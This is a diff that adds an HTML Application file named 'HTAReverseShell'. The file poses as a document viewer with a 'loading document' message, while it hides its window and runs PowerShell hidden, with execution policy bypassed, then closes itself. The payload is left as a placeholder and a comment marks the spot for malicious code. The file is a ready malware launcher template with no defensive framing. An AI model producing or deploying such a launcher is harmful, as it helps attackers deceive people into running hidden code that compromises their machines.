@@ -1,0 +1,25 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    ID="HTAReverseShell"
+    APPLICATIONNAME="Document Viewer"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    SYSMENU="no"
+    CAPTION="no"
+/>
+<title>Please wait, loading document...</title>
+<script language="JScript">
+    // Malicious JScript/PowerShell code goes here
+    var shell = new ActiveXObject("WScript.Shell");
+    // Example command to run PowerShell
+    var command = "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"YOUR_PAYLOAD_HERE\"";
+    shell.Run(command, 0, true);
+    self.close(); // Close the HTA window immediately
+</script>
+</head>
+<body>
+    <!-- User-facing content (if any) -->
+    <p>Loading document, please wait.</p>
+</body>
+</html>
